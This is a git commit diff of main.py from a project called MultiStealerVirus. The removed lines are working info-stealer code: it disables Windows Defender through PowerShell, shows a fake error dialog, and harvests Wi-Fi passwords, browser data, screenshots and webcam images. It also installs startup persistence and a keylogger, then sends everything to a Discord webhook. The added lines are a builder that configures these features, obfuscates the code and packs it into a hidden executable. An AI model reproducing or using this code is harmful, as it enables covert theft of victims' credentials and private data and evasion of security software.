3570f4c3f58b70b53ab08393f1729126150099d7
Josakko <112590914+Josakko@users.noreply.github.com>
2023-05-23 17:24:33 +0200

    Update main.py

--- main.py
+++ main.py
@@ -1,142 +1,167 @@
-from modules.browser import run
-from modules.browser import delete_files
-from modules.info import start
-from modules.wifi import WifiPasswords
-from modules.keylogger import Keylogger
-from modules.startup import StartUp
-from modules.antidebug import Antidebug
-from tkinter import messagebox
-import os
-import zipfile
 import subprocess
-import discord
-from discord import File, SyncWebhook
-import socket
+import os
+import shutil
+from colorama import Fore, Style
+import sys
+import time
 import requests
-from config import DEFENDER, ERROR, KEYLOGGER, STARTUP, WEBHOOK, ANTIDEBUG
+from rich.progress import BarColumn, Progress, SpinnerColumn, TextColumn, TimeElapsedColumn
 
-if ANTIDEBUG:
-    try:
-        Antidebug()
-    except:
-        pass
 
-def disable_defender():
-    #C:\> Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && Set-MpPreference -SubmitSamplesConsent 2
-    cmd = "powershell Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && powershell Set-MpPreference -SubmitSamplesConsent 2"
-    try:
-        subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)#subprocess.run(cmd, capture_output=True)
-    except:
-        pass
+def create_env(dir):
+    progress.start()
+    task = progress.add_task("Creating env...", total=1)
+    files = ["main.py", "modules/browser.py", "modules/antidebug.py", "modules/info.py", "modules/wifi.py", "modules/startup.py", "modules/keylogger.py"]
+    path = os.path.join(os.getcwd(), dir)
     
-if DEFENDER:
-    disable_defender()
-
-def error():
-    messagebox.showerror("Fatal Error", "Error code: 0x80070002\nAn internal error occurred while importing modules.")  
+    if not os.path.exists(path):
+        progress.stop()
+        print(f"[-] Failed to make build env please make sure that you have source code in '{path}' folder!")
+        time.sleep(3)
+        sys.exit(1)
+        
+    os.mkdir(os.path.join(os.getcwd(), "build", "modules"))
     
-if ERROR:
-    error()
-
-
-try:
-    start()
-except:
-    pass
-
-try:
-    wifi = WifiPasswords()
-    wifi.run()
-except:
-    pass
-
-try:
-    run()
-except:
-    pass
-
-if STARTUP:
-    try:
-        StartUp()
-    except:
-        pass
-
-def zip(name, files):
-    try:
-        with zipfile.ZipFile(name, "w") as zip:
-            for file in files:
-                try:
-                    zip.write(file)
-                except:
-                    pass
-    except:
-        pass
-    
-zip("System.zip", ["wifi.txt", "system.txt", "screenshot.png", "webcam.png"])
-delete_files(["wifi.txt", "system.txt"]) #delete_files(["wifi.txt", "system.txt", "screenshot.png"])
-
-zip_files = []
-
-dir = os.getcwd()
-for filename in os.listdir(dir):
-    if filename.endswith(".zip") and filename != "System.zip":
-        with zipfile.ZipFile(os.path.join(dir, filename), 'r') as zipfile_:
-            if len(zipfile_.namelist()) != 0:
-                zip_files.append(filename)
-            #if len(zipfile_.namelist()) == 0:
-            #    delete_files([os.path.join(dir, filename)])
-            #else:
-            #    zip_files.append(filename)
-
-
-def send(url, files, text):
-    try:
-        webhook = SyncWebhook.from_url(url)#https://discord.com/api/webhooks/ID/TOKEN
-    except:
-        return
-
-    try:
-        ip = requests.get("https://api.ipify.org").text
-    except:
-        ip = "Unknown"
-
-    embed = discord.Embed(
-        title = text,
-        description = f"{text} for: {socket.gethostname()}, {ip}",
-        color = 0x10131c
-    )
-
-    file_dirs = files#["System.zip", "screenshot.png"]
-    files = []
-
-    for file in file_dirs:
+    for file in files:
         try:
-            files.append(File(file))
+            shutil.copyfile(f"{path}/{file}", f"build/{file}")
         except:
+            progress.stop()
+            print(f"[-] Failed to make build env please make sure that you have source code in '{path}' folder!")
+            time.sleep(3)
+            sys.exit(1)
+    
+    progress.update(task, advance=1)
+
+
+def obfuscate():
+    task1 = progress.add_task("Obfuscating...", total=1)
+    try:
+        subprocess.run(f"pyminifier -o build/main.py build/main.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# main.py
+        subprocess.run(f"pyminifier -o build/modules/browser.py build/modules/browser.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/browser.py
+        subprocess.run(f"pyminifier -o build/modules/info.py build/modules/info.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/info.py
+        subprocess.run(f"pyminifier -o build/modules/startup.py build/modules/startup.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/startup.py
+        subprocess.run(f"pyminifier -o build/modules/antidebug.py build/modules/antidebug.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/antidebug.py
+        subprocess.run(f"pyminifier -o build/modules/wifi.py build/modules/wifi.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/wifi.py
+        subprocess.run(f"pyminifier -o build/modules/keylogger.py build/modules/keylogger.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)# modules/keylogger.py
+        progress.update(task1, advance=1)
+    except:
+        progress.stop()
+        print("[-] To obfuscate please install pyminifier or disable obfuscation from building options!")
+        time.sleep(3)
+        sys.exit(1)
+    
+
+def build(path, icon, upx=True, obf=True):
+    create_env(path)
+    if obf: obfuscate()
+    task2 = progress.add_task("Compiling...", total=1)
+    
+    if upx:
+        UpxArg = "--upx-dir C:/UPX"
+    else:
+        UpxArg = ""
+    
+    try:
+        subprocess.run(f"pyinstaller  --onefile -w -i {icon} --clean {UpxArg} build/main.py", stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
+        try:
+            shutil.rmtree(os.path.join(os.getcwd(), "build"))
+            os.remove(os.path.join(os.getcwd(), "main.spec"))
+        except: 
             pass
-
-    embed.set_footer(text="github.com/Josakko/MultiStealerVirus")
-    try:
-        webhook.send(embed=embed, files=files)
+        progress.update(task2, advance=1)
+        progress.stop()
+        print(Fore.GREEN +"[+] All done!"+ Style.RESET_ALL)
+        time.sleep(3)
     except:
-        pass
+        progress.stop()
+        print(Fore.RED +"[-] Please make sure you have pyinstaller, pyminifier and UPX installed under C:/UPX!"+ Style.RESET_ALL)
+        time.sleep(3)
+        sys.exit(1)
+    
+    
+def convert(value, name):
+    if value.lower() == "y":
+        return True
+    elif value.lower() == "n":
+        return False
+    else:
+        print(Fore.RED +f"[-] Choice for {name} is invalid, please enter 'y' for yes or 'n' for no!"+ Style.RESET_ALL)
+        time.sleep(3)
+        sys.exit(0)
 
-try:
-    send(WEBHOOK, ["System.zip", "screenshot.png"], "System Info")
-    delete_files(["screenshot.png"])
-except:
-    pass
 
-try:
-    #send(WEBHOOK, ["Chrome.zip", "Brave.zip", "Chromium.zip", "Edge.zip", "Opera.zip", "OperaGX.zip"], "Browser Data")
-    send(WEBHOOK, zip_files, "Browser Data")
-except:
-    pass
+def config(webhook, webhook_keylogger, interval, startup, keylogger, error, antidebug, defender, move):    
+    config = f"WEBHOOK = '{webhook}'\nWEBHOOK_KEYLOGGER = '{webhook_keylogger}'\nINTERVAL = {interval}\nSTARTUP = {startup}\nKEYLOGGER = {keylogger}\nERROR = {error}\nANTIDEBUG = {antidebug}\nDEFENDER = {defender}\nMOVE = {move}"
+    build_dir = os.path.join(os.getcwd(), "build")
+
+    
+    if os.path.exists(build_dir):
+        shutil.rmtree(build_dir)
+        os.mkdir(build_dir)
+    else:
+        os.mkdir(build_dir)
+    
+    with open(f"build\config.py", "w") as f:
+        f.write(config)
 
 
-if KEYLOGGER:
+def validate(url):
     try:
-        keyLogger = Keylogger()
-        keyLogger.run()
+        response = requests.get(url)
+        if response.status_code == 200:
+            return
+        else:
+            print(Fore.RED +"Webhook URL is invalid!"+ Style.RESET_ALL)
+            time.sleep(3)
+            sys.exit(0)
     except:
-        pass
+        print(Fore.RED +"Webhook URL is invalid!"+ Style.RESET_ALL)
+        time.sleep(3)
+        sys.exit(0)
+
+
+progress = Progress(
+    TextColumn("[bold blue]{task.description}", justify="right"),
+    BarColumn(bar_width=None),
+    SpinnerColumn(style="bold", spinner_name="simpleDotsScrolling", speed=1),
+    TimeElapsedColumn()
+)
+
+
+webhook = input("[?] Enter webhook URL for browser info, system info and saved wifi: ")
+validate(webhook)
+error = input("[?] Enable fake error? [Y/n]: ")
+defender = input("[?] Enable win defender disabler? [Y/n]: ")
+startup  = input("[?] Enable startup? [Y/n]: ")
+antidebug = input("[?] Enable antidebug? [Y/n]: ")
+move = input("[?] Move the malware to the special location? [Y/n]: ")
+
+keylogger = input("[?] Enable keylogger? [Y/n]: ")
+if keylogger.lower() == "y":
+    keylogger_webhook = input("[?] Enter webhook URL for keylogger: ")
+    validate(keylogger_webhook)
+    interval = input("[?] Enter interval for keylogger sending (in secondes): ")
+else:
+    keylogger_webhook = "null"
+    interval = 0
+    
+
+choice = input("> Do you want to edit building options[y/N]: ")
+if choice.lower() == "y":
+    obf = input("[?] Do you want to enable obfuscation? [Y/n]: ")
+    upx = input("[?] Use UPX? [Y/n]: ")
+    icon = input("[?] Enter icon file: ")
+    path = input("[?] Enter source code directory: ")
+    
+    config(webhook, keylogger_webhook, interval, convert(startup, "startup"), convert(keylogger, "keylogger"), convert(error, "error"), convert(antidebug, "antidebug"), convert(defender, "defender disabler"), convert(move, "move to dedicated location"))
+    build(path, icon, convert(upx, "UPX"), convert(obf, "obfuscation"))
+    
+elif choice.lower() == "n":
+    config(webhook, keylogger_webhook, interval, convert(startup, "startup"), convert(keylogger, "keylogger"), convert(error, "error"), convert(antidebug, "antidebug"), convert(defender, "defender disabler"), convert(move, "move to dedicated location"))
+    build("src", "icon.ico")
+    
+else:
+    print(Fore.RED +"[-] Your choice was invalid, please enter 'y' for yes or 'n' for no!"+ Style.RESET_ALL)
+    time.sleep(3)
+    sys.exit(0)
